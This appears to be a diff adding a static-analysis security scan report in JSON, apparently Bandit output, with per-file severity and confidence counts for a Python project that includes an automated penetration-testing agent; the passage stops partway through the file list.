@@ -1,0 +1,4445 @@
+{
+  "errors": [],
+  "generated_at": "2026-07-18T02:04:02Z",
+  "metrics": {
+    "_totals": {
+      "CONFIDENCE.HIGH": 91,
+      "CONFIDENCE.LOW": 1,
+      "CONFIDENCE.MEDIUM": 63,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 142,
+      "SEVERITY.MEDIUM": 13,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 29322,
+      "nosec": 0,
+      "skipped_tests": 4
+    },
+    "app\\__init__.py": {
+      "CONFIDENCE.HIGH": 0,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 0,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 0,
+      "SEVERITY.MEDIUM": 0,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 0,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "app\\core\\__init__.py": {
+      "CONFIDENCE.HIGH": 0,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 0,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 0,
+      "SEVERITY.MEDIUM": 0,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 42,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "app\\core\\asset_graph.py": {
+      "CONFIDENCE.HIGH": 0,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 0,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 0,
+      "SEVERITY.MEDIUM": 0,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 113,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "app\\core\\contracts.py": {
+      "CONFIDENCE.HIGH": 0,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 0,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 0,
+      "SEVERITY.MEDIUM": 0,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 135,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "app\\core\\done_gate.py": {
+      "CONFIDENCE.HIGH": 0,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 0,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 0,
+      "SEVERITY.MEDIUM": 0,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 61,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "app\\core\\event_store.py": {
+      "CONFIDENCE.HIGH": 0,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 0,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 0,
+      "SEVERITY.MEDIUM": 0,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 92,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "app\\core\\evidence.py": {
+      "CONFIDENCE.HIGH": 0,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 0,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 0,
+      "SEVERITY.MEDIUM": 0,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 89,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "app\\core\\local_auth.py": {
+      "CONFIDENCE.HIGH": 0,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 0,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 0,
+      "SEVERITY.MEDIUM": 0,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 23,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "app\\core\\scope_policy.py": {
+      "CONFIDENCE.HIGH": 0,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 0,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 0,
+      "SEVERITY.MEDIUM": 0,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 130,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "app\\core\\session_manager.py": {
+      "CONFIDENCE.HIGH": 0,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 0,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 0,
+      "SEVERITY.MEDIUM": 0,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 84,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "app\\core\\teaching_report.py": {
+      "CONFIDENCE.HIGH": 0,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 0,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 0,
+      "SEVERITY.MEDIUM": 0,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 67,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "app\\main.py": {
+      "CONFIDENCE.HIGH": 4,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 0,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 4,
+      "SEVERITY.MEDIUM": 0,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 241,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "app\\models\\__init__.py": {
+      "CONFIDENCE.HIGH": 0,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 0,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 0,
+      "SEVERITY.MEDIUM": 0,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 0,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "app\\models\\types.py": {
+      "CONFIDENCE.HIGH": 0,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 0,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 0,
+      "SEVERITY.MEDIUM": 0,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 310,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "app\\routers\\__init__.py": {
+      "CONFIDENCE.HIGH": 0,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 0,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 0,
+      "SEVERITY.MEDIUM": 0,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 0,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "app\\routers\\api.py": {
+      "CONFIDENCE.HIGH": 3,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 0,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 3,
+      "SEVERITY.MEDIUM": 0,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 2108,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "app\\services\\__init__.py": {
+      "CONFIDENCE.HIGH": 0,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 0,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 0,
+      "SEVERITY.MEDIUM": 0,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 0,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "app\\services\\detection_manager.py": {
+      "CONFIDENCE.HIGH": 0,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 0,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 0,
+      "SEVERITY.MEDIUM": 0,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 290,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "app\\services\\device_info.py": {
+      "CONFIDENCE.HIGH": 22,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 0,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 22,
+      "SEVERITY.MEDIUM": 0,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 114,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "app\\services\\discover.py": {
+      "CONFIDENCE.HIGH": 0,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 0,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 0,
+      "SEVERITY.MEDIUM": 0,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 121,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "app\\services\\experience_store\\__init__.py": {
+      "CONFIDENCE.HIGH": 0,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 0,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 0,
+      "SEVERITY.MEDIUM": 0,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 2,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "app\\services\\experience_store\\store.py": {
+      "CONFIDENCE.HIGH": 2,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 0,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 2,
+      "SEVERITY.MEDIUM": 0,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 353,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "app\\services\\file_analysis.py": {
+      "CONFIDENCE.HIGH": 0,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 3,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 0,
+      "SEVERITY.MEDIUM": 3,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 226,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "app\\services\\log_analysis.py": {
+      "CONFIDENCE.HIGH": 0,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 0,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 0,
+      "SEVERITY.MEDIUM": 0,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 370,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "app\\services\\online_search\\__init__.py": {
+      "CONFIDENCE.HIGH": 0,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 0,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 0,
+      "SEVERITY.MEDIUM": 0,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 11,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "app\\services\\online_search\\cache.py": {
+      "CONFIDENCE.HIGH": 0,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 0,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 0,
+      "SEVERITY.MEDIUM": 0,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 119,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "app\\services\\online_search\\default_creds_client.py": {
+      "CONFIDENCE.HIGH": 1,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 46,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 46,
+      "SEVERITY.MEDIUM": 1,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 186,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "app\\services\\online_search\\msf_module_client.py": {
+      "CONFIDENCE.HIGH": 1,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 0,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 0,
+      "SEVERITY.MEDIUM": 1,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 195,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "app\\services\\online_search\\nvd_client.py": {
+      "CONFIDENCE.HIGH": 1,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 0,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 0,
+      "SEVERITY.MEDIUM": 1,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 178,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "app\\services\\online_search\\registry.py": {
+      "CONFIDENCE.HIGH": 0,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 0,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 0,
+      "SEVERITY.MEDIUM": 0,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 359,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "app\\services\\pentest_agent\\__init__.py": {
+      "CONFIDENCE.HIGH": 0,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 0,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 0,
+      "SEVERITY.MEDIUM": 0,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 4,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "app\\services\\pentest_agent\\agent.py": {
+      "CONFIDENCE.HIGH": 8,
+      "CONFIDENCE.LOW": 1,
+      "CONFIDENCE.MEDIUM": 3,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 11,
+      "SEVERITY.MEDIUM": 1,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 5443,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "app\\services\\pentest_agent\\capabilities.py": {
+      "CONFIDENCE.HIGH": 0,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 0,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 0,
+      "SEVERITY.MEDIUM": 0,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 339,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "app\\services\\pentest_agent\\critic.py": {
+      "CONFIDENCE.HIGH": 0,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 0,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 0,
+      "SEVERITY.MEDIUM": 0,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 196,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "app\\services\\pentest_agent\\direct_exploits.py": {
+      "CONFIDENCE.HIGH": 0,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 2,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 0,
+      "SEVERITY.MEDIUM": 2,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 998,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "app\\services\\pentest_agent\\executor.py": {
+      "CONFIDENCE.HIGH": 6,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 2,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 8,
+      "SEVERITY.MEDIUM": 0,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 2429,
+      "nosec": 0,
+      "skipped_tests": 2
+    },
+    "app\\services\\pentest_agent\\exploit_lib\\__init__.py": {
+      "CONFIDENCE.HIGH": 7,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 0,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 6,
+      "SEVERITY.MEDIUM": 1,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 381,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "app\\services\\pentest_agent\\exploit_retry.py": {
+      "CONFIDENCE.HIGH": 1,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 1,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 1,
+      "SEVERITY.MEDIUM": 1,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 271,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "app\\services\\pentest_agent\\interactive_session.py": {
+      "CONFIDENCE.HIGH": 3,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 0,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 3,
+      "SEVERITY.MEDIUM": 0,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 273,
+      "nosec": 0,
+      "skipped_tests": 1
+    },
+    "app\\services\\pentest_agent\\kali_executor.py": {
+      "CONFIDENCE.HIGH": 2,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 0,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 2,
+      "SEVERITY.MEDIUM": 0,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 242,
+      "nosec": 0,
+      "skipped_tests": 1
+    },
+    "app\\services\\pentest_agent\\llm_client.py": {
+      "CONFIDENCE.HIGH": 2,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 0,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 2,
+      "SEVERITY.MEDIUM": 0,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 461,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "app\\services\\pentest_agent\\planner.py": {
+      "CONFIDENCE.HIGH": 1,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 1,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 1,
+      "SEVERITY.MEDIUM": 1,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 1984,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "app\\services\\pentest_agent\\planner_rules.py": {
+      "CONFIDENCE.HIGH": 0,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 0,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 0,
+      "SEVERITY.MEDIUM": 0,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 393,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "app\\services\\pentest_agent\\protocol_adapters\\__init__.py": {
+      "CONFIDENCE.HIGH": 0,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 0,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 0,
+      "SEVERITY.MEDIUM": 0,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 68,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "app\\services\\pentest_agent\\protocol_adapters\\base.py": {
+      "CONFIDENCE.HIGH": 0,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 0,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 0,
+      "SEVERITY.MEDIUM": 0,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 45,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "app\\services\\pentest_agent\\protocol_adapters\\jmx_adapter.py": {
+      "CONFIDENCE.HIGH": 2,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 0,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 2,
+      "SEVERITY.MEDIUM": 0,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 201,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "app\\services\\pentest_agent\\protocol_adapters\\mongo_adapter.py": {
+      "CONFIDENCE.HIGH": 1,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 1,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 2,
+      "SEVERITY.MEDIUM": 0,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 274,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "app\\services\\pentest_agent\\protocol_adapters\\redis_adapter.py": {
+      "CONFIDENCE.HIGH": 2,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 1,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 3,
+      "SEVERITY.MEDIUM": 0,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 343,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "app\\services\\pentest_agent\\python_exploit.py": {
+      "CONFIDENCE.HIGH": 5,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 0,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 5,
+      "SEVERITY.MEDIUM": 0,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 220,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "app\\services\\pentest_agent\\reflection.py": {
+      "CONFIDENCE.HIGH": 3,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 0,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 3,
+      "SEVERITY.MEDIUM": 0,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 588,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "app\\services\\pentest_agent\\reporting.py": {
+      "CONFIDENCE.HIGH": 0,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 0,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 0,
+      "SEVERITY.MEDIUM": 0,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 620,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "app\\services\\pentest_agent\\state.py": {
+      "CONFIDENCE.HIGH": 1,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 1,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 2,
+      "SEVERITY.MEDIUM": 0,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 2567,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "app\\services\\pentest_agent\\success_judge.py": {
+      "CONFIDENCE.HIGH": 0,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 0,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 0,
+      "SEVERITY.MEDIUM": 0,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 234,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "app\\services\\pentest_agent\\tool_registry.py": {
+      "CONFIDENCE.HIGH": 0,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 0,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 0,
+      "SEVERITY.MEDIUM": 0,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 447,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "app\\services\\settings.py": {
+      "CONFIDENCE.HIGH": 0,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 0,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 0,
+      "SEVERITY.MEDIUM": 0,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 131,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "app\\services\\skill_engine\\__init__.py": {
+      "CONFIDENCE.HIGH": 0,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 0,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 0,
+      "SEVERITY.MEDIUM": 0,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 30,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "app\\services\\skill_engine\\encoder.py": {
+      "CONFIDENCE.HIGH": 0,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 0,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 0,
+      "SEVERITY.MEDIUM": 0,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 66,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "app\\services\\skill_engine\\failure_skill_generator.py": {
+      "CONFIDENCE.HIGH": 0,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 0,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 0,
+      "SEVERITY.MEDIUM": 0,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 218,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "app\\services\\skill_engine\\import_anthropic_skills.py": {
+      "CONFIDENCE.HIGH": 1,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 1,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 1,
+      "SEVERITY.MEDIUM": 1,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 61,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "app\\services\\skill_engine\\lifecycle_manager.py": {
+      "CONFIDENCE.HIGH": 0,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 0,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 0,
+      "SEVERITY.MEDIUM": 0,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 210,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "app\\services\\skill_engine\\quality_gate.py": {
+      "CONFIDENCE.HIGH": 1,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 0,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 1,
+      "SEVERITY.MEDIUM": 0,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 244,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "app\\services\\skill_engine\\skill_embedding_index.py": {
+      "CONFIDENCE.HIGH": 0,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 0,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 0,
+      "SEVERITY.MEDIUM": 0,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 206,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "app\\services\\skill_engine\\skill_generator.py": {
+      "CONFIDENCE.HIGH": 1,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 0,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 1,
+      "SEVERITY.MEDIUM": 0,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 1003,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "app\\services\\skill_engine\\skill_index.py": {
+      "CONFIDENCE.HIGH": 0,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 0,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 0,
+      "SEVERITY.MEDIUM": 0,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 165,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "app\\services\\skill_engine\\skill_loader.py": {
